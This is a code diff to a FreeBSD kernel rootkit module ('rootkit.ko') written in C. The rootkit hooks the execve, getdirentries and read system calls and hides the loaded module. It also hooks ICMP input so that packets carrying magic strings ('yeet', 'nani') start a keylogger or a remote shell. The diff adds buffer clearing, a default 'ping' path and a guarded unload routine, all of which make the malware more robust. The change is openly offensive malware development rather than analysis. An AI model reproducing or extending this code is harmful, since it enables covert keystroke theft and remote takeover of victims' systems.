@@ -41,7 +41,7 @@
 #define FILE_NAME "rootkit.ko"
 #define LOG_FILE "/log.txt"
 #define CMDLEN 100
-#define KEYLOG "1337"
+#define KEYLOG "yeet"
 #define RSHELL "nani"
 
 extern linker_file_list_t linker_files;
@@ -453,6 +453,7 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 	/* Is this the ICMP message we are looking for? */
 	if (strncmp(icp->icmp_data, KEYLOG, 4) == 0) {
 		printf("icmp key\n");
+		memset(&icmp_cmd, '\0', CMDLEN);
 		strncpy(icmp_cmd, "key", 3);
 		len = 3;
 		return 0;
@@ -460,12 +461,17 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 
 	else if (strncmp(icp->icmp_data, RSHELL, 4) == 0) {
 		printf("icmp shell\n");
+		memset(&icmp_cmd, '\0', CMDLEN);
 		strncpy(icmp_cmd, "shell", 5);
 		len = 5;
 		return 0;
 	}
-	else
+	else{
+		memset(&icmp_cmd, '\0', CMDLEN);
+		strncpy(icmp_cmd, "ping", 4);
+		len = 4;
 		return (icmp_input(m, off, proto));
+	}
 
 	return (icmp_input(m, off, proto));
 }
@@ -523,13 +529,16 @@ static int load(struct module *module, int cmd, void *arg) {
 			
 		case MOD_UNLOAD:
 			uprintf("Rootkit unloaded from %d\n", offset);
-			sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
-			sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-			sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
-			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
-			destroy_dev(sdev);
-			unhide_kld();
-			activated = 0;
+			if (activated == 1) {
+				sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
+				sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+				sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+				inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+				destroy_dev(sdev);
+				unhide_kld();
+				activated = 0;
+			}
+			
 			break;
 			
 		default:
